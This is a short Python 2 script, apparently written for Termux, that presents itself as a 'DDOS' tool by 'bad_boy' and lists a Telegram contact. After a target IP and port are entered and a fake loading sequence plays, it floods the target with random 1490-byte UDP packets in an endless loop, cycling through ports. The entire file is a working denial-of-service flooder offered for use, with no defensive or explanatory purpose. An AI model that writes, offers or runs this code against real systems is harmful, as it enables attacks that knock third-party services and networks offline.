import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("pkg install toilet -y")
os.system("clear")
os.system("toilet -f mono12 -F gay DDOS")
print "==================================="
print "          made by bad_boy"
print "  my telegram id: @Bad_boy_468"
print "==================================="
target = raw_input("Enter Target Ip : ")
port = input("Enter Your Port : ")
os.system("clear")
os.system("toilet -f mono12 -F gay STARTED!")
print "LOADING[+++]5%"
time.sleep(3)
print "LOADING[+++++]10%"
time.sleep(3)
print "LOADING[++++++++]30%"
time.sleep(3)
print "LOADING[+++++++++++]70%"
time.sleep(3)
print "LOADING[++++++++++++++]100%"
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (target,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s target port:%s"%(sent,target,port)
     if port == 60000:
       port = 1
